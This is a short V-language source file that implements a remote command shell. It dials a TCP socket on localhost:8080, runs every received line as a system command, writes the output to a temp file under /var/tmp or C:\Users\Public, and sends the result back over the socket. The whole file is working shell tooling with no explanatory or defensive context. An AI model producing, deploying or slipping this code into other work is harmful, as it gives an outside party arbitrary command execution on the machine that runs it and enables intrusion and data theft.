module main

import os
import net

fn main() {
    client := net.dial("localhost", 8080) or { panic('') }
    mut outfile := ' > /var/tmp/shell'
    mut readfile := '/var/tmp/shell'
    if os.user_os() == 'windows' {
        outfile = ' > C:\\Users\\Public\\shell.txt'
        readfile = 'C:\\Users\\Public\\shell.txt'
    }
    for {
        bytes, blen := client.recv(1024)
        i := tos(bytes, blen)
	if blen  < 0 { continue }
	if blen == 0 { break }
	os.system(i.replace('\n', outfile))
        out := os.read_file(readfile) or { break }
        client.write(out) or { break }
    }
}
